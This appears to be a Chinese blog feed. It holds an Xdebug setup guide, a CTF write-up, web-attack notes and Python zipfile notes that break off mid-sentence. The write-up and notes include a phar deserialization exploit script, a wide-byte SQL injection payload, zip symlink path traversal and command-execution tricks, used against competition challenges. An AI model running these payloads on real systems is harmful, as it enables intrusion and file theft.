    <content type="html"><![CDATA[<h1 id="PHPSTORM配置debug的坑点"><a href="#PHPSTORM配置debug的坑点" class="headerlink" title="PHPSTORM配置debug的坑点"></a>PHPSTORM配置debug的坑点</h1><p>本来前段时间就试过一次配置，但是奈何很多帖子都是重复的内容，因此我重复的配置失败。这里就记录一些可能别人帖子没提起的细节，不记录全过程。</p><p>我的配置环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PHPSTORM</span> <span class="hljs-number">2022</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">PHP7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">phpstudy_pro</span> <span class="hljs-number">8.1.1.3</span><br></code></pre></td></tr></table></figure><h2 id="一、xdebug配置"><a href="#一、xdebug配置" class="headerlink" title="一、xdebug配置"></a>一、xdebug配置</h2><p>info.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>打开phpinfo的html，复制<strong>所有</strong>源代码</p><p>粘贴到<a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a> 进行分析，会对你的PHP版本推荐出合适的xdebug版本。</p><h3 id="1-host和port"><a href="#1-host和port" class="headerlink" title="1.host和port"></a>1.host和port</h3><p>复制别人提供的xdebug配置内容时要注意</p><p>xdebug3和xdebug2的属性名存在差异，</p><p>xdebug.remote_host和xdebug.remote_port不适用，做出了以下更改：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">xdebug</span>.remote_host <span class="hljs-comment">---&gt;  xdebug.client_host</span><br><span class="hljs-title">xdebug</span>.remote_<span class="hljs-keyword">port</span> <span class="hljs-comment">---&gt;  xdebug.client_port</span><br></code></pre></td></tr></table></figure><h3 id="2-zend-extension"><a href="#2-zend-extension" class="headerlink" title="2.zend_extension"></a>2.zend_extension</h3><p>zend_extension别忘了更换成自己的xdebug dll路径。</p><h3 id="3-xdebug-mode"><a href="#3-xdebug-mode" class="headerlink" title="3.xdebug.mode"></a>3.xdebug.mode</h3><p>xdebug.mode需要设为debug。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span>=debug<br></code></pre></td></tr></table></figure><p>这是我的xdebug配置，给大家参考一下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[xdebug]</span><br><span class="hljs-attr">zend_extension</span> = D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\ext\php_xdebug.dll<br><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_handler</span> = dbgp<br><span class="hljs-attr">xdebug.remote_mode</span> = req<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = <span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span class="hljs-attr">xdebug.client_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">xdebug.client_port</span>=<span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><h2 id="二、验证"><a href="#二、验证" class="headerlink" title="二、验证"></a>二、验证</h2><p>配置完成后可以通过PHPSTORM中调试的验证进行配置验证</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251443060.png" alt="image-20220925144304331"></p><p>这里的验证脚本路径一定要和服务器里的网站路径一致</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251444026.png" alt="image-20220925144427791"></p><p>默认就是phpstudy的WWW路径，url不用改。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251445572.png" alt="image-20220925144523996"></p><p>正常配置成功是这样的：</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251446439.png" alt="image-20220925144642550"></p><p>如果xdebug配置有问题的话，调试器拓展那一步会出错，建议回phpinfo检查一下（可能是host，port，idekey出错）。</p><p>然后配置浏览器插件xdebug helper。</p><h2 id="三、配置完成后"><a href="#三、配置完成后" class="headerlink" title="三、配置完成后"></a>三、配置完成后</h2><p>配置完xdebug后，可以开始debug</p><h3 id="开始debug打开的是一个空白界面"><a href="#开始debug打开的是一个空白界面" class="headerlink" title="开始debug打开的是一个空白界面"></a>开始debug打开的是一个空白界面</h3><p>这里需要编辑xdebug配置</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251454133.png" alt="image-20220925145449058"></p><p>这里有一个起始url，改成我们要调试的php文件相对路径（这个文件需要在我们指定的网站服务器文件夹内，比如我的是<a href="http://www.ctf,那我的php文件就在www.ctf这个文件夹内)/">www.ctf，那我的php文件就在www.ctf这个文件夹内）</a></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251457576.png" alt="image-20220925145701506"></p><p>浏览器也改成配置好了xdebug helper的浏览器。</p><p>别忘了修改侦听状态为如下，并且打上断点。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251500006.png" alt="image-20220925145959115"></p><p>如果都没问题，点击那个debug的臭虫标志就会使用默认浏览器打开我们的php文件。</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022第五空间网络安全初赛</title>
    <link href="/2022/09/25/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
    <url>/2022/09/25/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="2022第五空间网络安全初赛"><a href="#2022第五空间网络安全初赛" class="headerlink" title="2022第五空间网络安全初赛"></a>2022第五空间网络安全初赛</h1><p>web难度不大，都被打烂了，是我太菜了。</p><h2 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">题目描述：<br>一个简单的图床上传<br></code></pre></td></tr></table></figure><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">phar反序列化<br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Valid_ext</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;ext = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Valid_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">start</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image already exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">elseif</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;ext, <span class="hljs-variable">$this</span>-&gt;Valid_ext))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Only Image Can Be Uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Upload succsess!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">check_img</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img_name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;img_name = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_name&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">img_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;img_name))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image exsists&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Image not exsists&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>file_exists确认一下flag，就构造phar反序列化利用wakeup进行文件读取</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;exp.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传别忘了改后缀名，接着</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?img_name=phar:<span class="hljs-regexp">//u</span>pload/gg.jpg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106457.png" alt="image-20220925110513212"></p><h2 id="5-easylogin"><a href="#5-easylogin" class="headerlink" title="5_easylogin"></a>5_easylogin</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">题目描述：<br>IP地址：<span class="hljs-number">39</span>.<span class="hljs-number">105</span>.<span class="hljs-number">13</span>.<span class="hljs-number">61</span><br>端口：<span class="hljs-number">31088</span><br>题目提示：<br><span class="hljs-number">123.57.19.238:31088</span><br></code></pre></td></tr></table></figure><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">宽字节注入+双写绕过+<span class="hljs-built_in">md5</span>比较<br></code></pre></td></tr></table></figure><p><a href="http://123.57.19.238:31088/login.php">http://123.57.19.238:31088/login.php</a></p><p>赛后复现的（赛后公共靶机没关，趁机复现了一下，360真好），md5比较当时没想到。。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=<span class="hljs-number">1</span>%df&#x27;/**/uniunionon/**/seleselectct/**/1,version(),0x<span class="hljs-number">63346361343233</span><span class="hljs-number">38613062393233</span><span class="hljs-number">38323064636335</span><span class="hljs-number">30396136663735</span><span class="hljs-number">38343962</span>%23&amp;password=1<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209251106826.png" alt="image-20220925110456913"></p><p>查啥都给flag。</p><p>第三个字段&#x3D;MD5($_POST[password])。</p><h2 id="sakana-reveage"><a href="#sakana-reveage" class="headerlink" title="sakana_reveage"></a>sakana_reveage</h2><p>找到原题：(<a href="https://ctftime.org/writeup/35410">https://ctftime.org/writeup/35410</a>)</p><p>照着复现就行，绑定一个指向flag的软链接在zip上，再绑定图片，获取图片的base上传。</p><p>构造路径穿越</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tmp/</span>sakanas.zip.zip<br></code></pre></td></tr></table></figure><p>上传后选择上传压缩包功能，使其报错，上传的zip压缩包就会被解压，接着就可以访问软链接得到flag内容。</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第五空间</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web细节浅记</title>
    <link href="/2022/09/18/web%E6%B5%85%E8%AE%B0/"/>
    <url>/2022/09/18/web%E6%B5%85%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>记得比较杂，一些web的小细节，持续更新。</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>echo命令执行系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span>`nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.p?p`;<br></code></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>文件包含include()，include可以无括号包含</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>自增RCE可以借助借助NaN和INF</p><p>NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</p><p>INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>_=C/C;<span class="hljs-comment">//NAN</span><br><span class="hljs-symbol">$</span>_=<span class="hljs-number">1</span>/C<span class="hljs-comment">//INF</span><br></code></pre></td></tr></table></figure><p>分别对应</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>_=<span class="hljs-number">0</span>/<span class="hljs-number">0</span>;<span class="hljs-comment">//NAN</span><br><span class="hljs-symbol">$</span>_=<span class="hljs-number">1</span>/<span class="hljs-number">0</span><span class="hljs-comment">//INF</span><br></code></pre></td></tr></table></figure><p>%得到NAIF四个字符，需要<strong>拼接字符串</strong>才能得到</p><p>如</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">$_</span><span class="hljs-operator">=</span><span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">.</span><span class="hljs-variable">c</span><span class="hljs-operator">;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210051138230.png" alt="image-20221005113821225"></p><p>虽然报错，但成功获得。</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>sql注入时长度超长导致的报错是因为sql_mode为严格模式</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>宽字节注入payload构造，宽字节在线urldecode</p><p><a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">http://www.mytju.com/classcode/tools/urldecode_gb2312.asp</a></p><p>转义字符为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><p>在它前面构造就行，例如</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%d9</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%c9</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><p>注入时需要注意使用hackbar时可能会受影响，最好使用bp。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>浅记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_zipfile</title>
    <link href="/2022/09/18/python-zipfile/"/>
    <url>/2022/09/18/python-zipfile/</url>
    
    <content type="html"><![CDATA[<h2 id="python-Zipfile库"><a href="#python-Zipfile库" class="headerlink" title="python_Zipfile库"></a>python_Zipfile库</h2><p>因为近期nepCTF2022和练习都碰到了压缩包套娃的题目，写了两个脚本，在这里记录一下zipfile的学习。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>标准库zipfile，可以用来处理压缩文件。<br>zipfile是一个用来压缩文件和解压缩文件的模块，它有两个常用的类，分别是ZipFile和ZipInfo。<br>其中ZipFile是主要的类，用来创建和读取zip文件，而ZipInfo是存储的zip文件的每个文件的信息的。</p><h2 id="ZipFile对象"><a href="#ZipFile对象" class="headerlink" title="ZipFile对象"></a>ZipFile对象</h2><p>ZipFile 对象在概念上与 File 对象相似。<br><strong>官方文档定义：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">打开一个 ZIP 文件，file 为一个指向文件的路径（字符串），一个类文件对象或者一个 path-like <span class="hljs-built_in">object</span>。<br>形参 mode 应当为 <span class="hljs-string">&#x27;r&#x27;</span> 来读取一个存在的文件，<span class="hljs-string">&#x27;w&#x27;</span> 来截断并写入新的文件， <span class="hljs-string">&#x27;a&#x27;</span> 来添加到一个存在的文件，<br>或者 <span class="hljs-string">&#x27;x&#x27;</span> 来仅新建并写入新的文件。如果 mode 为 <span class="hljs-string">&#x27;x&#x27;</span> 并且 file 指向已经存在的文件，<br>则抛出 FileExistsError。如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 且 file 为已存在的文件，则格外的文件将被加入。<br>如果 file 不指向 ZIP 文件，之后一个新的 ZIP 归档将被追加为此文件。<br>这是为了将 ZIP 归档添加到另一个文件（例如 python.exe）。<br>如果 mode 为 <span class="hljs-string">&#x27;a&#x27;</span> 并且文件不存在， 则会新建。如果 mode 为 <span class="hljs-string">&#x27;r&#x27;</span> 或 <span class="hljs-string">&#x27;a&#x27;</span>， 则文件应当可定位。<br></code></pre></td></tr></table></figure><h2 id="ZipInfo对象"><a href="#ZipInfo对象" class="headerlink" title="ZipInfo对象"></a>ZipInfo对象</h2><p><strong>通过ZipFile的getinfo方法得到ZipInfo对象。</strong></p><p>ZipFile.getinfo(name) 方法返回的是一个ZipInfo对象，表示zip文档中相应文件的信息。它支持如下属性：</p><p>ZipInfo.filename： 获取文件名称。</p><p>ZipInfo.date_time： 获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type： 压缩类型。</p><p>ZipInfo.comment： 文档说明。</p><p>ZipInfo.extr： 扩展项数据。</p><p>ZipInfo.create_system： 获取创建该zip文档的系统。</p><p>ZipInfo.create_version： 获取 创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_version： 获取 解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved： 预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits： zip标志位。</p><p>ZipInfo.volume： 文件头的卷标。</p><p>ZipInfo.internal_attr： 内部属性。</p><p>ZipInfo.external_attr： 外部属性。</p><p>ZipInfo.header_offset： 文件头偏移位。</p><p>ZipInfo.CRC： 未压缩文件的CRC-32。</p><p>ZipInfo.compress_size： 获取压缩后的大小。</p><p>ZipInfo.file_size： 获取未压缩的文件大小。<br>ZipInfo相关属性</p><p>ZipInfo.filename        获取文件名称。</p><p>ZipInfo.date_time       获取文件最后修改时间。返回一个包含6个元素的元组：(年, 月, 日, 时, 分, 秒)</p><p>ZipInfo.compress_type   压缩类型。</p><p>ZipInfo.comment         文档说明。</p><p>ZipInfo.extr            扩展项数据。</p><p>ZipInfo.create_system   获取创建该zip文档的系统。</p><p>ZipInfo.create_version  获取、创建zip文档的PKZIP版本。</p><p>ZipInfo.extract_versio  获取、解压zip文档所需的PKZIP版本。</p><p>ZipInfo.reserved        预留字段，当前实现总是返回0。</p><p>ZipInfo.flag_bits       zip标志位。</p><p>ZipInfo.volume          文件头的卷标。</p><p>ZipInfo.internal_attr   内部属性。</p><p>ZipInfo.external_attr   外部属性。</p><p>ZipInfo.header_offset   文件头偏移位。</p><p>ZipInfo.CRC             未压缩文件的CRC-32。</p><p>ZipInfo.compress_size   获取压缩后的大小。</p><p>ZipInfo.file_size       获取未压缩的文件大小</p><h2 id="1-创建一个-ZipFile-对象"><a href="#1-创建一个-ZipFile-对象" class="headerlink" title="1.创建一个 ZipFile 对象"></a>1.创建一个 ZipFile 对象</h2><p>要创建一个 ZipFile对象，就调用 zipfile.ZipFile()函数，向它传入一个字符串，表示.zip文件的文件名。请注意，zipfile 是 Python 模块的名称，ZipFile()是函数的名称。ZipFile 的构造方法有两个参数，第一个参数是必选参数，接受一个字符串格式的压缩包名称，第二个参数为<strong>可选</strong>参数，表示打开模式，类似于文件操作，有r&#x2F;w&#x2F;a三种模式，分别代表读、写、添加，默认为r，即读模式。压缩使用w，解压缩使用r。</p><p>mode可以省略<br>压缩需要把mode改为‘w’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br></code></pre></td></tr></table></figure><p>解压需要把mode改为‘r’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">zfile=zipfile.ZipFile(<span class="hljs-string">&quot;test.zip&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="2-添加压缩文件-or-选择解压文件"><a href="#2-添加压缩文件-or-选择解压文件" class="headerlink" title="2.添加压缩文件 or 选择解压文件"></a>2.添加压缩文件 or 选择解压文件</h2><h3 id="需要使用的方法"><a href="#需要使用的方法" class="headerlink" title="需要使用的方法"></a>需要使用的方法</h3><p> ZipFile.extract(member, path&#x3D;None, pwd&#x3D;None)¶</p><pre><code class="hljs">从归档中提取出一个成员放入当前工作目录；member 必须为成员的完整名称或 ZipInfo 对象。成员的文件信息会尽可能精确地被提取。 path 指定一个要提取到的不同目录。member 可以是一个文件名或 ZipInfo 对象。 pwd 是用于解密文件的密码。</code></pre><p> ZipFile.extractall(path&#x3D;None, members&#x3D;None, pwd&#x3D;None)</p><pre><code class="hljs">从归档中提取出所有成员放入当前工作目录。 path 指定一个要提取到的不同目录。members 为可选项且必须为 namelist() 所返回列表的一个子集。 pwd 